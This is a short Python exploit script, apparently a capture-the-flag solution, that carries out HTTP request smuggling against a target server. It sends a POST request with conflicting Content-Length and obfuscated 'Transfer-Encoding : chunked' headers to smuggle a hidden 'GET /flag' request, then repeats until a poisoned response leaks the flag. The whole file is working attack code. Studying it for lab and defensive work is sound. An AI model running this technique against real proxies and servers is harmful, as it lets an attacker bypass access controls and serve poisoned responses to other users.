#!/usr/bin/env python3
import sys, socket, textwrap, time

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080

payload1 = textwrap.dedent(f"""\
    POST / HTTP/1.1
    Host: vuln
    Content-Length: 39
    Transfer-Encoding : chunked

    0

    GET /flag HTTP/1.1
    Host: vuln

    """).replace("\n", "\r\n").encode()

payload2 = textwrap.dedent(f"""\
    GET / HTTP/1.1
    Host: vuln
    Connection: close

    """).replace("\n", "\r\n").encode()


while True:
    with socket.create_connection((host, port)) as s:
        s.sendall(payload1) # Request Smuggling
        s.sendall(payload2) # Get Poisoned Response
        resp = b""
        while True:
            data = s.recv(1024)
            if not data:
                break
            resp += data
        decoded = resp.decode("latin1", errors="replace")
        if "sknb{" in decoded:
            flag = decoded.split("sknb{")[1].split("}")[0]
            print(f"sknb{{{flag}}}")
            break

    time.sleep(0.1)
